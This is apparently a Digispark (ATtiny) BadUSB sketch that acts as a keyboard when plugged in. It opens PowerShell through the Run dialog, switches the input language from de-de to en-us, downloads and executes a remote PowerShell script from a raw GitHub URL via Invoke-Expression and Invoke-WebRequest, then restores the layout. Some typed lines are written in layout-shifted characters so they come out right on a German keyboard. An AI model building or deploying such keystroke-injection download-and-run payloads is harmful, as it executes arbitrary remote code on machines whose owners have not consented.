/*
  Following payload will force the keyboard layout to en-us (currently from de-de only) and restores the previous settings after the execution. 
  Payload: Executes the PowerShell script stored at https://raw.githubusercontent.com/rbnkng/RemoteLoadedPSScript/main/Get-ServiceTest.ps1
*/

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  // Open PowerShell
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //Set Langage to en-us
  DigiKeyboard.println("$a = Get-WinUserLanguageList");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("$a ) Get/WinUserLanguageList");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set/WinUserLanguageList /force @en/us@");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-WinUserLanguageList -force 'en-us'");
  DigiKeyboard.delay(500);
  
  //Fetch script from GH + execute it
  DigiKeyboard.println("Invoke-Expression (Invoke-WebRequest https://raw.githubusercontent.com/rbnkng/RemoteLoadedPSScript/main/Get-ServiceTest.ps1).Content");
    
  // Restore language settings
  DigiKeyboard.println("Set-WinUserLanguageList -force $a");
  DigiKeyboard.delay(500);
   
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  while(true){
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(500);
  }
  
}
